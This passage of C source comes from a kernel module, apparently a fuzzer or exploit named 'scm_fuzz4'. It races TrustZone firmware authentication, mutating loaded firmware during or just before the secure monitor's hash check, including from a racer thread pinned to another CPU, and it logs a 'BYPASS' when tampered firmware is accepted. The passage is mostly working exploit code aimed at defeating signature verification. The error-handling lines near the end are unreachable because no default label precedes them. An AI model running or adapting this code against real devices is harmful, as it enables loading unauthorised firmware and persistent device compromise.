            if (nread != fsize) { vfree(fw_buf); vfree(fw_backup); return -EIO; }
            memcpy(fw_backup, fw_buf, fsize); /* keep unmodified copy */

            for (attempt = 0; attempt < max_attempts; attempt++) {
                void __iomem *pil_region;

                /* Vary mutation: each attempt mutates a different offset
                 * Focus on code segment (0x1000+) since that's what we want to modify */
                race_mut_off = 0x1000 + (attempt * 4); /* 4-byte aligned mutations */

                do_pas_shutdown((u32)pid_val);
                msleep(5);

                /* init_image */
                {
                    struct file *mf;
                    void *mdt_buf;
                    loff_t mdt_size, mpos = 0;
                    ssize_t mr;
                    mf = filp_open("/tmp/fw_meta.bin", O_RDONLY, 0);
                    if (IS_ERR(mf)) break;
                    mdt_size = i_size_read(file_inode(mf));
                    mdt_buf = kzalloc(mdt_size, GFP_KERNEL | GFP_DMA);
                    if (!mdt_buf) { filp_close(mf, NULL); break; }
                    mr = kernel_read(mf, mdt_buf, mdt_size, &mpos);
                    filp_close(mf, NULL);
                    if (mr != mdt_size) { kfree(mdt_buf); break; }
                    ret = do_pas_init_image((u32)pid_val, mdt_buf, mdt_size);
                    kfree(mdt_buf);
                    if (ret) break;
                }

                ret = do_pas_mem_setup((u32)pid_val, pil_base, pil_size);
                if (ret) break;

                /* Load VALID firmware */
                pil_region = ioremap_wc(pil_base, pil_size);
                if (!pil_region) break;
                memcpy_toio(pil_region, fw_buf, fsize);
                if (fsize < pil_size)
                    memset_io(pil_region + fsize, 0, pil_size - fsize);
                mb();

                /* Strategy: write mutation payload just before issuing SCM call
                 * from the same thread. The write + SMC are so close together
                 * that TZ might have already started reading early memory but
                 * not reached our mutation offset yet. */

                /* Write the mutation - flip 4 bytes at varying offsets */
                if (race_mut_off + 4 <= fsize) {
                    u32 orig = readl(pil_region + race_mut_off);
                    writel(orig ^ 0xFFFFFFFF, pil_region + race_mut_off);
                    /* NO mb() - we want this to race! The store buffer might
                     * not be flushed to memory yet when TZ starts hashing. */
                }

                ret = do_pas_auth_reset((u32)pid_val);
                iounmap(pil_region);

                pr_info("scm_fuzz4: toctou[%d] off=0x%x auth ret=%d %s\n",
                        attempt, race_mut_off, ret,
                        ret == 0 ? "*** TOCTOU SUCCESS ***" : "rejected");

                if (ret == 0) {
                    /* Auth passed despite modification! Read back to verify the
                     * modification is in memory */
                    void __iomem *verify = ioremap(pil_base, pil_size);
                    if (verify) {
                        u32 v = readl(verify + race_mut_off);
                        u32 expected_orig;
                        memcpy(&expected_orig, fw_buf + race_mut_off, 4);
                        pr_info("scm_fuzz4: *** BYPASS at off=0x%x val=0x%08x (orig=0x%08x) ***\n",
                                race_mut_off, v, expected_orig);
                        iounmap(verify);
                    }
                    break;
                }
                msleep(20);
            }
            vfree(fw_buf);
            vfree(fw_backup);
            if (attempt >= max_attempts)
                pr_info("scm_fuzz4: toctou: no bypass found in %d attempts\n", max_attempts);
        }
        break;

    case 17: /* Concurrent TOCTOU v2: kthread on another CPU writes during SMC */
        if (pid_val < 0 || !arg1_val || !arg2_val) {
            pr_err("scm_fuzz4: need pid_val, arg1_val=phys_base, arg2_val=region_size\n");
            return -EINVAL;
        }
        {
            struct file *f;
            loff_t fsize, pos = 0;
            void *fw_buf;
            ssize_t nread;
            phys_addr_t pil_base = arg1_val;
            size_t pil_size = arg2_val;
            struct task_struct *racer;
            void __iomem *pil_region;
            int attempt;
            int max_attempts = (meta_type > 0) ? meta_type : 10;

            f = filp_open(meta_path, O_RDONLY, 0);
            if (IS_ERR(f)) return PTR_ERR(f);
            fsize = i_size_read(file_inode(f));
            if (fsize <= 0 || fsize > pil_size) { filp_close(f, NULL); return -EINVAL; }
            fw_buf = vmalloc(fsize);
            if (!fw_buf) { filp_close(f, NULL); return -ENOMEM; }
            nread = kernel_read(f, fw_buf, fsize, &pos);
            filp_close(f, NULL);
            if (nread != fsize) { vfree(fw_buf); return -EIO; }

            for (attempt = 0; attempt < max_attempts; attempt++) {
                race_off = 0x1000 + (attempt % 16) * 0x1000; /* different segment each try */
                if (race_off >= fsize) race_off = 0x1000;
                race_should_stop = 0;
                race_loops = 0;
                reinit_completion(&race_start);
                reinit_completion(&race_end);

                do_pas_shutdown((u32)pid_val);
                msleep(5);

                /* init_image */
                {
                    struct file *mf;
                    void *mdt_buf;
                    loff_t mdt_size, mpos = 0;
                    ssize_t mr;
                    mf = filp_open("/tmp/fw_meta.bin", O_RDONLY, 0);
                    if (IS_ERR(mf)) break;
                    mdt_size = i_size_read(file_inode(mf));
                    mdt_buf = kzalloc(mdt_size, GFP_KERNEL | GFP_DMA);
                    if (!mdt_buf) { filp_close(mf, NULL); break; }
                    mr = kernel_read(mf, mdt_buf, mdt_size, &mpos);
                    filp_close(mf, NULL);
                    if (mr != mdt_size) { kfree(mdt_buf); break; }
                    ret = do_pas_init_image((u32)pid_val, mdt_buf, mdt_size);
                    kfree(mdt_buf);
                    if (ret) break;
                }

                ret = do_pas_mem_setup((u32)pid_val, pil_base, pil_size);
                if (ret) break;

                pil_region = ioremap_wc(pil_base, pil_size);
                if (!pil_region) break;

                /* Load valid firmware */
                memcpy_toio(pil_region, fw_buf, fsize);
                if (fsize < pil_size)
                    memset_io(pil_region + fsize, 0, pil_size - fsize);
                mb();

                race_pil = pil_region;

                /* Create racer thread on a DIFFERENT CPU */
                racer = kthread_create(race_thread_fn, NULL, "scm_racer");

                if (IS_ERR(racer)) {
                    iounmap(pil_region);
                    pr_err("scm_fuzz4: kthread_create failed\n");
                    break;
                }

                /* Bind to a different CPU than current */
                {
                    int my_cpu = smp_processor_id();
                    int target_cpu = (my_cpu + 1) % num_online_cpus();
                    kthread_bind(racer, target_cpu);
                    pr_info("scm_fuzz4: toctou2[%d] main=CPU%d racer=CPU%d off=0x%x\n",
                            attempt, my_cpu, target_cpu, race_off);
                }

                wake_up_process(racer);
                complete(&race_start); /* signal racer to begin writing */

                /* Small delay to let racer start writing */
                udelay(10);

                /* Call auth while racer is flipping memory */
                ret = do_pas_auth_reset((u32)pid_val);

                /* Stop racer */
                race_should_stop = 1;
                wait_for_completion_timeout(&race_end, HZ);
                iounmap(pil_region);

                pr_info("scm_fuzz4: toctou2[%d] auth ret=%d loops=%d %s\n",
                        attempt, ret, race_loops,
                        ret == 0 ? "*** RACE WON ***" : "rejected");

                if (ret == 0) {
                    pr_info("scm_fuzz4: *** TOCTOU2 BYPASS at off=0x%x after %d loops ***\n",
                            race_off, race_loops);
                    break;
                }

                msleep(30);
            }
            vfree(fw_buf);
            if (attempt >= max_attempts)
                pr_info("scm_fuzz4: toctou2: no bypass in %d attempts\n", max_attempts);
        }
        break;
        pr_err("scm_fuzz4: invalid op %d\n", op);
        return -EINVAL;
    }

    pr_info("scm_fuzz4: === DONE ===\n");
    return 0;
}

static void __exit scm_fuzz_exit(void)
{
    pr_info("scm_fuzz4: unloaded\n");
}

module_init(scm_fuzz_init);
module_exit(scm_fuzz_exit);
